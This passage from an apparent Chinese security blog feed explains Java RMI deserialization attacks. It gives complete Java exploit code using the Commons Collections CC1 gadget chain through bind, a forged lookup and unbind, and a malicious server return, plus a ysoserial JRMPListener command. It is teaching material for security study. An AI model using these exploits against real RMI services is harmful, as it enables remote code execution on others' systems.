InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在CC1中它的起点是<code>AnnotationInvocationHandler.readObject()</code>, 它正好是一个<code>InvocationHandler</code></p><p>我们知道服务器接收到的对象是一个远程动态代理, 所以还需要稍作修改, </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();</span><br><span class="line">        <span class="type">Proxy</span> <span class="variable">proxy</span> <span class="operator">=</span> (Proxy) Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, handler);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(proxy);</span><br></pre></td></tr></table></figure><p>这样就得到了一个恶意的远程动态代理</p><p>完整的exp是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();</span><br><span class="line">        <span class="type">Proxy</span> <span class="variable">proxy</span> <span class="operator">=</span> (Proxy) Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, handler);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(proxy);</span><br><span class="line"></span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>, remote);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用它来请求带有CC1依赖的服务器即可完成攻击</p><p>注:</p><p>rebind 的攻击也是如此，将 <code>registry.bind(&quot;test&quot;,remote);</code> 替换为 <code>rebind(&quot;test&quot;,remote);</code> 方法即可。</p><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p><code>list()</code> 方法可以列出目标上所有绑定的对象</p><p>来看list对应的源码</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710181633835.png" alt="image-20240710181633835"></p><p>因为这里没有 <code>readObject()</code>，所以无法进行反序列化</p><p>因此没有什么利用价值</p><h3 id="lookup与unbind"><a href="#lookup与unbind" class="headerlink" title="lookup与unbind"></a>lookup与unbind</h3><p>这里lookup是有反序列化入口的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710182215919.png" alt="image-20240710182215919"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IHello</span> <span class="variable">ihello</span> <span class="operator">=</span> (IHello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br></pre></td></tr></table></figure><p>但在客户端这边我们只能传入字符串, 该怎么传入恶意类呢?</p><p>实际上我们可以通过反射直接修改lookup中用到的对象为恶意对象,并反射执行(简单说就是伪造一个lookup), 这样就可以绕过这一限制, 至于服务端的强制类型转换, 并不影响反序列化的执行</p><p>可以根据<code>RegistryImpl_Stub</code>这个类中的lookup方法来构造, 由于这个类是反编译过来的, 看起来还是比较麻烦, 先看最终的poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler));</span><br><span class="line"></span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取operations</span></span><br><span class="line"></span><br><span class="line">        Field[] fields_1 = registry.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 伪造lookup的代码，去伪造传输信息</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(remote);</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来看原本的lookup, 逐步分析我们自己的lookup是如何伪造的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710214158257.png" alt="image-20240710214158257"></p><p>首先是90行的newCall的调用, 我们必须得先获取到这个ref属性</p><p>我们根据继承关系找到这个ref定义的位置, 也就是RegistryImpl_Stub的父类的父类RemoteObject</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710214603105.png" alt="image-20240710214603105"></p><p>因此我们就可以这样来反射获取它</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br></pre></td></tr></table></figure><p>在newCall方法中有一个operations参数, 也需要反射获取, 这个值就在RegistryImpl_Stub中, 是一个私有常量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field[] fields_1 = registry.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry);</span><br></pre></td></tr></table></figure><p>接下来照着lookup中的形式编写代码即可, 但在写入数据时, 我们写入恶意对象remote</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(remote);</span><br><span class="line">        ref.invoke(var2);</span><br></pre></td></tr></table></figure><p>这里的ref.invoke就意味着进行网络传输了</p><p>对于unbind也是类似的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710215616245.png" alt="image-20240710215616245"></p><p>稍微修改一下即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">4</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(remote);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var4) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ref.invoke(var2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h2><h3 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h3><p>在进行bind unbind rebind list lookup这些操作时, 除了unbind rebind, 客户端都是会接收服务端返回的数据并进行反序列化的, 只要我们伪造一个注册中心, 返回恶意数据, 就能对客户端发起攻击</p><p>利用脚本太长, 直接用ysoserial现成的exp来验证了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#x27;calc&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240711143215299.png" alt="image-20240711143215299"></p><p>注意要用低版本的java, 我环境变量里是java18是运行不了的, 这里直接换到java1.8的目录里去执行</p><h3 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h3><p> 这里也比较好理解, 客户端调用远程方法, 服务端返回结果, 这个结果可以是一个对象, 客户端接收这个对象, 这过程服务端序列化对象, 客户端反序列化对象, 使得客户端易受攻击</p><p> 重写服务器上的远程方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;CC1&quot;</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> CC1();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">IHello</span> <span class="variable">iHello</span> <span class="operator">=</span> (IHello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) iHello.sayHello(<span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上是服务器返回恶意对象</p><p>另一种是加载远程对象</p><p>当服务器返回了一个客户端位置的类的对象时, 客户端可以指定一个URL，此时会通过URL来实例化对象。</p><p>这个利用条件相当苛刻</p><p>只有如下条件的服务器才能被攻击：</p><ol><li>设置了java.rmi.server.useCodebaseOnly&#x3D;false，或者java版本低于7u21、6u45（低于这几个版本默认为false）</li><li>设置<code>System.*setSecurityManager*(new RMISecurityManager());</code></li></ol><h2 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h2><h3 id="客户端攻击服务端"><a href="#客户端攻击服务端" class="headerlink" title="客户端攻击服务端"></a>客户端攻击服务端</h3><p>客户端和服务端传输对象都是序列化反序列化进行的, 因此可以互相打</p><p>对于服务端, 它需要有一个受攻击的方法, 接收一个对象作为参数, 这样在客户端传入恶意对象后, 服务端将其反序列化从而受到攻击</p><p>比较简单不做演示</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;客户端攻击注册中心&quot;&gt;&lt;a href=&quot;#客户端攻击注册中心&quot; class=&quot;headerlink&quot; title=&quot;客户端攻击注册中心&quot;&gt;&lt;/a&gt;客户端攻击注册中心&lt;/h2&gt;&lt;p&gt;客户端请求注册中心有 list, bind, rebind, unbind, loo</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java RMI</title>
    <link href="http://example.com/2024/06/06/Java-RMI/"/>
    <id>http://example.com/2024/06/06/Java-RMI/</id>
    <published>2024-06-06T01:55:14.000Z</published>
    <updated>2024-07-10T05:50:30.684Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-RMI"><a href="#Java-RMI" class="headerlink" title="Java RMI"></a>Java RMI</h1><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://goodapple.top/archives/321">https://goodapple.top/archives/321</a></p><p><a href="https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/">https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/</a></p><h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><h2 id="RMI的几个重要部分"><a href="#RMI的几个重要部分" class="headerlink" title="RMI的几个重要部分"></a>RMI的几个重要部分</h2><ul><li>Client-客户端：客户端调用服务端的方法</li><li>Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果</li><li>Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用（在低版本的JDK中，Server与Registry是可以不在一台服务器上的，而在高版本的JDK中，Server与Registry只能在一台服务器上，否则无法注册成功）</li></ul><h3 id="远程对象调用"><a href="#远程对象调用" class="headerlink" title="远程对象调用"></a>远程对象调用</h3><blockquote><p>在JVM之间通信时，RMI对远程对象和非远程对象的处理方式是不一样的，它并没有直接把远程对象复制一份传递给客户端，而是传递了一个远程对象的Stub（存根），Stub相当于远程对象的引用或者代理。Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法。Stub中包含了远程对象的定位信息，如Socket端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节。而位于服务器端的Skeleton（骨架）,能够读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值。所以RMI远程调用逻辑大致是这样的</p></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/%E5%9B%BE%E7%89%87-80.png" alt="图片-80"></p><h2 id="测试RMI"><a href="#测试RMI" class="headerlink" 